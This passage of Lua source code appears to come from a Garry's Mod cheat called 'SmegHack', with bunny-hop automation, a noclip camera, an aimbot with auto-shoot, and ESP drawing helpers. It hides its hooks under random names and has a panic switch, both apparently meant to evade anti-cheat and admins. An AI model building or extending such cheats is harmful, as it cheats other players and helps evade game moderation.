											surface.DrawLine( Bones[11].x, Bones[11].y, Bones[12].x, Bones[12].y )
											surface.DrawLine( Bones[12].x, Bones[12].y, Bones[13].x, Bones[13].y )

										end
									end
								end
							end
						end
					end
				end
			end
		end
	end)

	AddHook( "BhopCalcView", "CalcView", RandomString(), function( ply, pos, angles, fov )
		if GetConVarNumber("SmegHack_Panic") == 0 && SmegHack.Options["Bhop_Toggle"] then
			if SmegHack.Options["Bhop_Sideways"] then
				local CamData = {}
				if TapS then CamData.angles = LocalPlayer():EyeAngles()+Angle(0,180,0) else CamData.angles = LocalPlayer():EyeAngles()+Angle(0,90,0) end
				CamData.origin = LocalPlayer():GetShootPos()
				CamData.fov = fov

				return CamData
			elseif SmegHack.Options["Bhop_WOnly"] then
				local CamData = {}
				if WLeft then
					CamData.angles = LocalPlayer():EyeAngles()-Angle(0,90,0)
				elseif WRight then
					CamData.angles = LocalPlayer():EyeAngles()+Angle(0,90,0)
				elseif WBack then
					CamData.angles = LocalPlayer():EyeAngles()+Angle(0,180,0)
				end
				CamData.origin = LocalPlayer():GetShootPos()
				CamData.fov = fov

				return CamData
			end
		end
	end)
	AddHook( "Bhop", "CreateMove", RandomString(), function(ucmd)
		if SmegHack.Options["Bhop_Toggle"] && GetConVarNumber("SmegHack_Panic") == 0 then
			if SmegHack.Options["Bhop_FastWalk"] then
				if LocalPlayer():IsOnGround() && ( ucmd:KeyDown(IN_FORWARD) || ucmd:KeyDown(IN_BACK) ) then
					if FastWalk == false then
						ucmd:SetSideMove(ucmd:GetSideMove()-5000)
					else
						ucmd:SetSideMove(ucmd:GetSideMove()+5000)
					end
					FastWalk = !FastWalk
				end
			end
			if SmegHack.Options["Bhop_AutoHop"] then
				if ucmd:KeyDown(IN_JUMP) then
					if LocalPlayer():WaterLevel() <= 1 && LocalPlayer():GetMoveType() != MOVETYPE_LADDER && !LocalPlayer():IsOnGround() then
						ucmd:RemoveKey(IN_JUMP)
					end
				end
			end
			if SmegHack.Options["Bhop_AutoStrafe"] && !LocalPlayer():IsOnGround() && LocalPlayer():WaterLevel() <= 1 && LocalPlayer():GetMoveType() != MOVETYPE_LADDER && !( LocalPlayer():KeyDown(IN_FORWARD) || LocalPlayer():KeyDown(IN_BACK) || LocalPlayer():KeyDown(IN_MOVELEFT) || LocalPlayer():KeyDown(IN_MOVERIGHT) ) then
				if SmegHack.Options["Bhop_Sideways"] && !TapS then
					if ucmd:GetMouseX() < 0 then
						ucmd:SetForwardMove(-1000000)
					end
					if ucmd:GetMouseX() > 0 then
						ucmd:SetForwardMove(1000000)
					end
				elseif SmegHack.Options["Bhop_WOnly"] then
					if ucmd:GetMouseX() < 0 then
						ucmd:SetForwardMove(1000000)
						if !WLeft then
							if WRight then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
							elseif WForward then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
							elseif WBack then
								ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
							end
							WLeft = true
							WRight, WForward, WBack = false, false, false
						end
					elseif ucmd:GetMouseX() > 0 then
						ucmd:SetForwardMove(1000000)
						if !WRight then
							if WLeft then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
							elseif WForward then
								ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
							elseif WBack then
								ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
							end
							WRight = true
							WLeft, WForward, WBack = false, false, false
						end
					end
				else
					if ucmd:GetMouseX() < 0 then
						ucmd:SetSideMove(-1000000)
					end
					if ucmd:GetMouseX() > 0 then
						ucmd:SetSideMove(1000000)
					end
				end
			end
			if SmegHack.Options["Bhop_EdgeJump"] then
				if LocalPlayer():IsOnGround() then
					local WalkAngle
					if LocalPlayer():GetVelocity():Length() != 0 then
						WalkAngle = Angle( 0, LocalPlayer():GetVelocity():Angle().y, 0 )
					else
						WalkAngle = Angle( 0, LocalPlayer():EyeAngles().y, 0 )
					end
					local FinPos = LocalPlayer():EyePos() + (WalkAngle:Forward()*(SmegHack.Options["Bhop_EdgeJump_Distance"]-50))
					FinPos.z = LocalPlayer():GetPos().z-5
					local GroundDetect = {
							start = LocalPlayer():GetShootPos(),
							endpos = FinPos,
							filter = LocalPlayer(),
							mask = MASK_PLAYERSOLID
						}
					if util.TraceLine(GroundDetect).Fraction == 1 then
						ucmd:SetButtons( ucmd:GetButtons() + IN_JUMP )
					end
				end
				//LocalPlayer():SetEyeAngles(Angle( 0,LocalPlayer():GetVelocity():Angle().y,LocalPlayer():GetVelocity():Angle().z )) <-Just for safe keeping
			end
			if SmegHack.Options["Bhop_Sideways"] then
				if ucmd:KeyDown(IN_MOVELEFT) && !TapS then
					if ucmd:KeyDown(IN_MOVERIGHT) then ForwardMove = 0 elseif ForwardMove == 0 then ForwardMove = -1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				end
				if ucmd:KeyDown(IN_MOVERIGHT) && !TapS then
					if ucmd:KeyDown(IN_MOVELEFT) then ForwardMove = 0 elseif ForwardMove == 0 then ForwardMove = 1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				end
				if !ucmd:KeyDown(IN_MOVELEFT) && !ucmd:KeyDown(IN_MOVERIGHT) && !TapS then ForwardMove = 0 end

				if ucmd:KeyDown(IN_FORWARD) && !TapS then
					if ucmd:KeyDown(IN_BACK) then SideMove = 0 elseif SideMove == 0 then SideMove = -1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				end
				if ucmd:KeyDown(IN_BACK) && LocalPlayer():IsOnGround() && !TapS then
					if ucmd:KeyDown(IN_FORWARD) then SideMove = 0 elseif SideMove == 0 then SideMove = 1000000 end
					ucmd:SetSideMove(SideMove)
					ucmd:SetForwardMove(ForwardMove)
				elseif ucmd:KeyDown(IN_BACK) && !LocalPlayer():IsOnGround() && !TapS then
					ForwardMove = 1000000
					ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					ucmd:SetForwardMove(ForwardMove)
					TapS = true
				end
				if !ucmd:KeyDown(IN_FORWARD) && !ucmd:KeyDown(IN_BACK) && !TapS then SideMove = 0 end
				if !LocalPlayer():IsOnGround() && ucmd:KeyDown(IN_BACK) && TapS then
					ucmd:SetForwardMove(1000000)
				elseif ( !ucmd:KeyDown(IN_BACK) || LocalPlayer():IsOnGround() ) && TapS then
					ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					TapS = false
				end
			elseif SmegHack.Options["Bhop_WOnly"] then
				if ucmd:KeyDown(IN_MOVELEFT) && !WLeft then
					if WRight then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					elseif WForward then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					elseif WBack then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					end
					WLeft = true
					WRight, WForward, WBack = false, false, false
				elseif ucmd:KeyDown(IN_MOVERIGHT) && !WRight then
					if WLeft then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					elseif WForward then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					elseif WBack then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					end
					WRight = true
					WLeft, WForward, WBack = false, false, false
				elseif ucmd:KeyDown(IN_FORWARD) && !WForward then
					if WRight then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					elseif WLeft then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					elseif WBack then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					end
					WForward = true
					WLeft, WRight, WBack = false, false, false
				elseif ucmd:KeyDown(IN_BACK) && !WBack then
					if WRight then
						ucmd:SetViewAngles(ucmd:GetViewAngles()-Angle(0,90,0))
					elseif WForward then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,180,0))
					elseif WLeft then
						ucmd:SetViewAngles(ucmd:GetViewAngles()+Angle(0,90,0))
					end
					WBack = true
					WLeft, WRight, WForward = false, false, false
				end
				if !ucmd:KeyDown(IN_MOVELEFT) && !ucmd:KeyDown(IN_MOVERIGHT) && !ucmd:KeyDown(IN_FORWARD) && !ucmd:KeyDown(IN_BACK) then WActive = false else WActive = true end
				if WActive then
					ucmd:SetForwardMove(1000000)
					ucmd:SetSideMove(0)
				end
			end
		end
	end)

	AddHook( "Cams", "CalcView", RandomString(), function( ply, Pos, Ang, FOV )
		if SmegHack.Options["Cams_Toggle"] && GetConVarNumber("SmegHack_Panic") == 0 then
			local CamData = {}
			if SmegHack.Options["Cams_CSNoclip"] then
				local Speed = SmegHack.Options["Cams_CSNoclip_Speed"]/5
				local MouseAngs = Angle( NoclipY, NoclipX, 0 )
				if LocalPlayer():KeyDown(IN_SPEED) then
					Speed = Speed * 5
				end
				if LocalPlayer():KeyDown(IN_FORWARD) then
					NoclipPos = NoclipPos+(MouseAngs:Forward()*Speed)
				end
				if LocalPlayer():KeyDown(IN_BACK) then
					NoclipPos = NoclipPos-(MouseAngs:Forward()*Speed)
				end
				if LocalPlayer():KeyDown(IN_MOVELEFT) then
					NoclipPos = NoclipPos-(MouseAngs:Right()*Speed)
				end
				if LocalPlayer():KeyDown(IN_MOVERIGHT) then
					NoclipPos = NoclipPos+(MouseAngs:Right()*Speed)
				end
				if NoclipJump then
					NoclipPos = NoclipPos+Vector(0,0,Speed)
				end
				if NoclipDuck then
					NoclipPos = NoclipPos-Vector(0,0,Speed)
				end
				CamData.origin = NoclipPos
				CamData.angles = MouseAngs
				CamData.fov = FOV
				CamData.drawviewer = true
			elseif SmegHack.Options["Cams_ThirdPerson"] then
				CamData.origin = Pos-(Ang:Forward()*(SmegHack.Options["Cams_ThirdPerson_Zoom"]*10))
				CamData.angles = Ang
				CamData.fov = FOV
				CamData.drawviewer = true
			end
			return CamData
		end
	end)
	AddHook( "Bhop", "CreateMove", RandomString(), function(ucmd)
		if SmegHack.Options["Cams_Toggle"] && SmegHack.Options["Cams_CSNoclip"] && GetConVarNumber("SmegHack_Panic") == 0 then
			if NoclipOn == false then
				NoclipPos, NoclipAngles = LocalPlayer():EyePos(), ucmd:GetViewAngles()
				NoclipY, NoclipX = ucmd:GetViewAngles().x, ucmd:GetViewAngles().y
				NoclipOn = true
			end
			ucmd:ClearMovement()
			if ucmd:KeyDown(IN_JUMP) then
				ucmd:RemoveKey(IN_JUMP)
				NoclipJump = true
			elseif NoclipJump then
				NoclipJump = false
			end
			if ucmd:KeyDown(IN_DUCK) then
				ucmd:RemoveKey(IN_DUCK)
				NoclipDuck = true
			elseif NoclipDuck then
				NoclipDuck = false
			end
			NoclipX = NoclipX-(ucmd:GetMouseX()/50)
			if NoclipY+(ucmd:GetMouseY()/50) > 89 then NoclipY = 89 elseif NoclipY+(ucmd:GetMouseY()/50) < -89 then NoclipY = -89 else NoclipY = NoclipY+(ucmd:GetMouseY()/50) end
			ucmd:SetViewAngles(NoclipAngles)
		elseif NoclipOn == true then
			NoclipOn = false
		end
	end)
	if Display then
		AddHook( "Loaded", "HUDPaint", RandomString(), function()
			draw.SimpleTextOutlined( "Smeg Hack Loaded Successfully!", "Menu_Title", ScrW()/2, 50, Color(0,150,150), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0) )
			timer.Simple( 3, function()
				RemoveHook("Loaded")
			end)
		end)
	end
end

//Bones
SmegHack.Bones = {
"ValveBiped.Bip01_Head1",
"ValveBiped.Bip01_Neck1",
"ValveBiped.Bip01_Spine4",
"ValveBiped.Bip01_Spine2",
"ValveBiped.Bip01_Spine1",
"ValveBiped.Bip01_Spine",
"ValveBiped.Bip01_Pelvis",
"ValveBiped.Bip01_R_UpperArm",
"ValveBiped.Bip01_R_Forearm",
"ValveBiped.Bip01_R_Hand",
"ValveBiped.Bip01_L_UpperArm",
"ValveBiped.Bip01_L_Forearm",
"ValveBiped.Bip01_L_Hand",
"ValveBiped.Bip01_R_Thigh",
"ValveBiped.Bip01_R_Calf",
"ValveBiped.Bip01_R_Foot",
"ValveBiped.Bip01_R_Toe0",
"ValveBiped.Bip01_L_Thigh",
"ValveBiped.Bip01_L_Calf",
"ValveBiped.Bip01_L_Foot",
"ValveBiped.Bip01_L_Toe0"
}

//Key Binds
SmegHack.KeyBinds = {
[0] = "NONE",
[1] = "0",
[2] = "1",
[3] = "2",
[4] = "3",
[5] = "4",
[6] = "5",
[7] = "6",
[8] = "7",
[9] = "8",
[10] = "9",
[11] = "A",
[12] = "B",
[13] = "C",
[14] = "D",
[15] = "E",
[16] = "F",
[17] = "G",
[18] = "H",
[19] = "I",
[20] = "J",
[21] = "K",
[22] = "L",
[23] = "M",
[24] = "N",
[25] = "O",
[26] = "P",
[27] = "Q",
[28] = "R",
[29] = "S",
[30] = "T",
[31] = "U",
[32] = "V",
[33] = "W",
[34] = "X",
[35] = "Y",
[36] = "Z",
[37] = "PAD_0",
[38] = "PAD_1",
[39] = "PAD_2",
[40] = "PAD_3",
[41] = "PAD_4",
[42] = "PAD_5",
[43] = "PAD_6",
[44] = "PAD_7",
[45] = "PAD_8",
[46] = "PAD_9",
[47] = "PAD_DIVIDE",
[48] = "PAD_MULTIPLY",
[49] = "PAD_MINUS",
[50] = "PAD_PLUS",
[51] = "PAD_ENTER",
[52] = "PAD_DECIMAL",
[53] = "LBRACKET",
[54] = "RBRACKET",
[55] = "SEMICOLON",
[56] = "APOSTROPHE",
[57] = "BACKQUOTE",
[58] = "COMMA",
[59] = "PERIOD",
[60] = "SLASH",
[61] = "BACKSLASH",
[62] = "MINUS",
[63] = "EQUAL",
[64] = "ENTER",
[65] = "SPACE",
[66] = "BACKSPACE",
[67] = "TAB",
[68] = "CAPSLOCK",
[69] = "NUMLOCK",
[70] = "ESCAPE",
[71] = "SCROLLLOCK",
[72] = "INSERT",
[73] = "DELETE",
[74] = "HOME",
[75] = "END",
[76] = "PAGEUP",
[77] = "PAGEDOWN",
[78] = "BREAK",
[79] = "LSHIFT",
[80] = "RSHIFT",
[81] = "LALT",
[82] = "RALT",
[83] = "LCONTROL",
[84] = "RCONTROL",
[85] = "LWIN",
[86] = "RWIN",
[87] = "APP",
[88] = "UP",
[89] = "LEFT",
[90] = "DOWN",
[91] = "RIGHT",
[92] = "F1",
[93] = "F2",
[94] = "F3",
[95] = "F4",
[96] = "F5",
[97] = "F6",
[98] = "F7",
[99] = "F8",
[100] = "F9",
[101] = "F10",
[102] = "F11",
[103] = "F12",
//[104] = "CAPSLOCKTOGGLE",   These three screw up the binding process, probably wont bother working out how to fix it
//[105] = "NUMLOCKTOGGLE",
//[106] = "SCROLLLOCKTOGGLE",

//Xbox Controller Binds - These are untested as I don't own an xbox controller, so they might not work
[114] = "XBUTTON_A",
[115] = "XBUTTON_B",
[116] = "XBUTTON_X",
[117] = "XBUTTON_Y",
[118] = "XBUTTON_LEFT_SHOULDER",
[119] = "XBUTTON_RIGHT_SHOULDER",
[120] = "XBUTTON_BACK",
[121] = "XBUTTON_START",
[122] = "XBUTTON_STICK1",
[123] = "XBUTTON_STICK2",
[146] = "XBUTTON_UP",
[147] = "XBUTTON_RIGHT",
[148] = "XBUTTON_DOWN",
[149] = "XBUTTON_LEFT",
[150] = "XSTICK1_RIGHT",
[151] = "XSTICK1_LEFT",
[152] = "XSTICK1_DOWN",
[153] = "XSTICK1_UP",
[154] = "XBUTTON_LTRIGGER",
[155] = "XBUTTON_RTRIGGER",
[156] = "XSTICK2_RIGHT",
[157] = "XSTICK2_LEFT",
[158] = "XSTICK2_DOWN",
[159] = "XSTICK2_UP"
}

//Mouse Binds (Needs to be separate otherwise it doesn't work)
SmegHack.MouseBinds = {
[107] = "MOUSE_LEFT",
[108] = "MOUSE_RIGHT",
[109] = "MOUSE_MIDDLE",
[110] = "MOUSE_4",
[111] = "MOUSE_5",
[112] = "MOUSE_WHEEL_UP",
[113] = "MOUSE_WHEEL_DOWN"
}

//Aimbot
function Aimbot( FinAngle )
	if SmegHack.Options["Aimbot_SmoothAim"] then
		SmoothAngles( FinAngle, SmegHack.Options["Aimbot_SmoothAim_Value"] )
	else
		LocalPlayer():SetEyeAngles(FinAngle)
	end
end

function SmoothAngles( FinAngle, SmoothValue )
	local SmoothValue = 10-(10*(SmoothValue/1000))
	local CloseToAngle = false
	local SmoothDirectionX = 1
	local SmoothDirectionY = 1
	local CurAngle = LocalPlayer():EyeAngles()
	if FinAngle.x > 89 then FinAngle.x = FinAngle.x - 360 end
	if CurAngle == FinAngle then
		SmoothDirectionX = 1
	elseif CurAngle.y < 0 && FinAngle.y < 0 then
		CloseToAngle = true
		if CurAngle.y > FinAngle.y then
			SmoothDirectionX = 2
		elseif CurAngle.y < FinAngle.y then
			SmoothDirectionX = 3
		end
	elseif CurAngle.y >= 0 && FinAngle.y >= 0 then
		CloseToAngle = true
		if CurAngle.y > FinAngle.y then
			SmoothDirectionX = 2
		elseif CurAngle.y < FinAngle.y then
			SmoothDirectionX = 3
		end
	elseif CurAngle.y >= 0 && FinAngle.y < 0 then
		local FlipAngle = CurAngle-(Angle(0,180,0))
		if FlipAngle.y > FinAngle.y then
			SmoothDirectionX = 3
		elseif FlipAngle.y < FinAngle.y then
			SmoothDirectionX = 2
		end
	elseif CurAngle.y < 0 && FinAngle.y >= 0 then
		local FlipAngle = CurAngle+(Angle(0,180,0))
		if FlipAngle.y < FinAngle.y then
			SmoothDirectionX = 2	
		elseif FlipAngle.y > FinAngle.y then
			SmoothDirectionX = 3
		end
	end
	if FinAngle.x < CurAngle.x then
		SmoothDirectionY = 2
	elseif FinAngle.x > CurAngle.x then
		SmoothDirectionY = 3
	end
	local X, Y = false, false
	if SmoothDirectionX == 2 then
		if CurAngle.y-SmoothValue < FinAngle.y && CloseToAngle then
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,FinAngle.y,CurAngle.z))
			Y = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,CurAngle.y-SmoothValue,CurAngle.z))
		end
	elseif SmoothDirectionX == 3 then
		if CurAngle.y+SmoothValue > FinAngle.y && CloseToAngle then
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,FinAngle.y,CurAngle.z))
			Y = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x,CurAngle.y+SmoothValue,CurAngle.z))
		end
	end
	if SmoothDirectionY == 2 then
		//up
		if CurAngle.x-SmoothValue < FinAngle.x then
			LocalPlayer():SetEyeAngles(Angle(FinAngle.x,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
			X = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x-SmoothValue,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
		end
	elseif SmoothDirectionY == 3 then
		//down
		if CurAngle.x+SmoothValue > FinAngle.x then
			LocalPlayer():SetEyeAngles(Angle(FinAngle.x,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
			X = true
		else
			LocalPlayer():SetEyeAngles(Angle(CurAngle.x+SmoothValue,LocalPlayer():EyeAngles().y,LocalPlayer():EyeAngles().z))
		end
	end
	if SmegHack.Options["Aimbot_AutoShoot"] && X && Y then
		LocalPlayer():ConCommand("+attack")
		timer.Simple( 0.1, function() LocalPlayer():ConCommand("-attack") end )
	end
end

//ESP Functions
function ESPGetPos( Ent )
	if Ent:IsValid() then
		local Points = {
			Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMaxs().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMins().z ),
			Vector( Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z )
		}
		local MaxX, MaxY, MinX, MinY
		local V1, V2, V3, V4, V5, V6, V7, V8
		for k, v in pairs( Points ) do
			local ScreenPos = Ent:LocalToWorld( v ):ToScreen()
			if MaxX != nil then
				MaxX, MaxY, MinX, MinY = math.max( MaxX, ScreenPos.x ), math.max( MaxY, ScreenPos.y), math.min( MinX, ScreenPos.x ), math.min( MinY, ScreenPos.y)
			else
				MaxX, MaxY, MinX, MinY = ScreenPos.x, ScreenPos.y, ScreenPos.x, ScreenPos.y
			end

			if V1 == nil then
				V1 = ScreenPos
			elseif V2 == nil then
				V2 = ScreenPos
			elseif V3 == nil then
				V3 = ScreenPos
			elseif V4 == nil then
				V4 = ScreenPos
			elseif V5 == nil then
				V5 = ScreenPos
			elseif V6 == nil then
				V6 = ScreenPos
			elseif V7 == nil then
				V7 = ScreenPos
			elseif V8 == nil then
				V8 = ScreenPos
			end
		end
		return MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8
	end
end

//Menu Items
function AddMenuTab( Parent, Text, Tab, PosX, PosY, TabID )
	local AddMenuTab = vgui.Create( "DButton", Parent )
	AddMenuTab:SetText( Text )
	AddMenuTab:SetTextColor( Color(255,255,255) )
	AddMenuTab:SetPos( PosX, PosY )
	function AddMenuTab:Paint() end
	AddMenuTab.DoClick = function()
		ChangeTab( Tab, TabID )
	end
	if TabID == 12 then
		AddMenuTab:SetSize( 48, 30 )
	else
		AddMenuTab:SetSize( 49, 30 )
	end
end

function AddLabel( Parent, Text, PosX, PosY, CloseOn )
	local AddLabel = vgui.Create("DLabel", Parent)
	AddLabel:SetText( Text )
	AddLabel:SetPos( PosX, PosY )
	AddLabel:SetColor(Color(255,255,255,255))
	AddLabel:SizeToContents()
	if CloseOn != nil then
		AddLabel.Think = function()
			if CloseOn == "Admins" then
				if AdminsListBool then
					AddLabel:Remove()
				end
			elseif CloseOn == "Spectators" then
				if SpecsListBool then
					AddLabel:Remove()
				end
			end
		end
	end
	return AddLabel:GetSize()
end

function AddMainMenuButton( Parent, Text, PosX, PosY, DoClick )
	local AddMainMenuButton = vgui.Create( "DButton", Parent )
	AddMainMenuButton:SetText( Text )
	AddMainMenuButton:SetTextColor( Color(255,255,255) )
	AddMainMenuButton:SetSize( 100, 30 )
	AddMainMenuButton:SetPos( PosX, PosY )
	function AddMainMenuButton:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
		
		surface.SetDrawColor( Color(0,0,0,255) )
		surface.DrawOutlinedRect( 0, 0, w, h )
	end
	AddMainMenuButton.DoClick = DoClick
end

function AddGenericButton( Parent, Text, SizeX, SizeY, PosX, PosY, DoClick )
	local AddGenericButton = vgui.Create( "DButton", Parent )
	AddGenericButton:SetText( Text )
	AddGenericButton:SetTextColor( Color(255,255,255) )
	AddGenericButton:SetSize( SizeX, SizeY )
	AddGenericButton:SetPos( PosX, PosY )
	function AddGenericButton:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
		
		surface.SetDrawColor( Color(0,0,0,255) )
		surface.DrawOutlinedRect( 0, 0, w, h )
	end
	AddGenericButton.DoClick = DoClick
end

function AddKeyBind( Parent, PosX, PosY, Var )
	local KeyBind = vgui.Create( "DButton", Parent )
	if SmegHack.Options["Aimbot_AimOnKey_Key"] >= 107 && SmegHack.Options["Aimbot_AimOnKey_Key"] <= 113 then
		KeyBind:SetText( SmegHack.MouseBinds[SmegHack.Options["Aimbot_AimOnKey_Key"]])
	else
		KeyBind:SetText( SmegHack.KeyBinds[SmegHack.Options["Aimbot_AimOnKey_Key"]])
	end
	KeyBind:SetTextColor( Color(255,255,255,255) )
	KeyBind:SetSize( 100, 15 )
	KeyBind:SetPos( PosX, PosY )
	KeyBind:SetTooltip( "Click button then press any key to change bind" )
	KeyBind.Paint = function()
		draw.RoundedBox( 0, 1, 1, 99, 14, Color(150,150,150,255) )
		surface.SetDrawColor( Color(0,0,0) )
		surface.DrawOutlinedRect( 0, 0, 100, 15 )
	end
	KeyBind.DoClick = function()
		KeyBind:SetText("...")
		local NoClickMenu = vgui.Create( "DFrame" )
		NoClickMenu:SetTitle("")
		NoClickMenu:ShowCloseButton(false)
		NoClickMenu:SetDraggable(false)
		NoClickMenu:SetSize(ScrW(), ScrH())
		NoClickMenu:Center()
		NoClickMenu:MakePopup()
		function NoClickMenu:Paint( w, h )
			draw.RoundedBox( 0, 0, 0, w, h, Color(0,0,0,150) )
			draw.SimpleTextOutlined( "Press Any Key", "Menu_Title", w/2, h/2, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
			draw.SimpleTextOutlined( "Press ESC to cancel", "Menu_Title", w/2, h/2+30, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
			draw.SimpleTextOutlined( "Hold ESC to clear bind", "Menu_Title", w/2, h/2+60, Color(255,255,255),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color(0,0,0))
		end
		local ESCStuff, ESCNum = false, 0
		KeyBind.Think = function()
			if !ESCStuff then
				for i = 107, 113 do
					if input.IsMouseDown(i) then
						SmegHack.Options[Var] = i
						KeyBind:SetText(SmegHack.MouseBinds[i])
						NoClickMenu:Close()
						KeyBind.Think = nil
					end
				end
				for i = 0, 159 do
					if input.IsKeyDown(i) then
						if i == 70 then
							LocalPlayer():ConCommand("cancelselect")
							ESCStuff = true
						else
							SmegHack.Options[Var] = i
							KeyBind:SetText(SmegHack.KeyBinds[i])
							NoClickMenu:Close()
							KeyBind.Think = nil
						end
					end
				end
			else
				if input.IsKeyDown(70) then
					if ESCNum >= 200 then
						SmegHack.Options[Var] = 0
						KeyBind:SetText(SmegHack.KeyBinds[0])
						NoClickMenu:Close()
						KeyBind.Think = nil
					else ESCNum = ESCNum + 1 end
				else
					KeyBind:SetText(SmegHack.KeyBinds[SmegHack.Options[Var]])
					NoClickMenu:Close()
					KeyBind.Think = nil
				end
			end
		end
	end
end

function AddCheckBox( Parent, Text, PosX, PosY, ToolTip, Var, ExtraFunc )
	local AddCheckBox = vgui.Create( "DCheckBoxLabel", Parent )
	AddCheckBox:SetText( Text )
	AddCheckBox:SetPos( PosX, PosY )
	AddCheckBox:SetTooltip( ToolTip )
	AddCheckBox:SetTextColor( Color(255,255,255,255) )
	AddCheckBox:SizeToContents()
	AddCheckBox:SetChecked( SmegHack.Options[Var] )
	AddCheckBox.OnChange = function()
		SmegHack.Options[Var] = AddCheckBox:GetChecked()
		if ExtraFunc != nil then
			local IsChecked = AddCheckBox:GetChecked()
			ExtraFunc()
		end
	end
end

function AddBoneButton( Parent, PosX, PosY, Bone )
	local AddBoneButton = vgui.Create( "DButton", Parent )
	if table.HasValue( SmegHack.BoneOrder, Bone ) then
		for k, v in pairs(SmegHack.BoneOrder) do
			if v == Bone then
				AddBoneButton:SetText(tostring(k))
			end
		end
	else
		AddBoneButton:SetText("-")
	end
	AddBoneButton:SetTextColor( Color(255,255,255,255) )
	AddBoneButton:SetSize( 16, 16 )
	AddBoneButton:SetPos( PosX-8, PosY-8 )
	AddBoneButton:SetTooltip( "Select bones in the order you want to aim at them" )
	function AddBoneButton:Paint( w, h )
		draw.RoundedBox( 0, 0, 0, w, h, Color(150,150,150,255) )
		
		surface.SetDrawColor( Color(0,0,0,255) )
		surface.DrawOutlinedRect( 0, 0, w, h )
	end
	AddBoneButton.DoRightClick = function()
		local BoneNum
		if table.HasValue( SmegHack.BoneOrder, Bone ) then
			for k, v in pairs( SmegHack.BoneOrder ) do
				if v == Bone then BoneNum = k end
			end
		else BoneNum = 0 end

		if BoneNum == 0 then
			table.insert( SmegHack.BoneOrder, Bone )
		elseif BoneNum == 1 then
			table.remove( SmegHack.BoneOrder, BoneNum )
		else
			table.remove( SmegHack.BoneOrder, BoneNum )
			table.insert( SmegHack.BoneOrder, BoneNum-1, Bone )
		end
		UpdateBoneThink = true
	end
	AddBoneButton.DoClick = function()
		local BoneNum
		if table.HasValue( SmegHack.BoneOrder, Bone ) then
			for k, v in pairs( SmegHack.BoneOrder ) do
				if v == Bone then BoneNum = k end
			end
		else BoneNum = 0 end

		if BoneNum == 0 then
			table.insert( SmegHack.BoneOrder, 1, Bone )
		elseif BoneNum == 21 then
			table.remove( SmegHack.BoneOrder, BoneNum )
		else
			if BoneNum != table.Count( SmegHack.BoneOrder ) then
				table.remove( SmegHack.BoneOrder, BoneNum )
				table.insert( SmegHack.BoneOrder, BoneNum+1, Bone )
			else
				table.remove( SmegHack.BoneOrder, BoneNum )
			end
		end
		UpdateBoneThink = true
	end
	AddBoneButton.Think = function()
		if UpdateBoneThink then
			if UpdateBoneThinkNum != 21 then
				local BoneNum
				if table.HasValue( SmegHack.BoneOrder, Bone ) then
					for k, v in pairs( SmegHack.BoneOrder ) do
						if v == Bone then BoneNum = k end
					end
				else BoneNum = 0 end
				if BoneNum != 0 then
					AddBoneButton:SetText(tostring(BoneNum))
				else
					AddBoneButton:SetText("-")
				end
				UpdateBoneThinkNum = UpdateBoneThinkNum+1
			end
			if UpdateBoneThinkNum == 21 then
				UpdateBoneThinkNum = 0
				UpdateBoneThink = false
			end
		end
	end
end

function AddComboBox( Parent, PosX, PosY, SizeX, SizeY, Var, ChoiceTable, ExtraFunc )
	local AddComboBox = vgui.Create( "DComboBox", Parent )
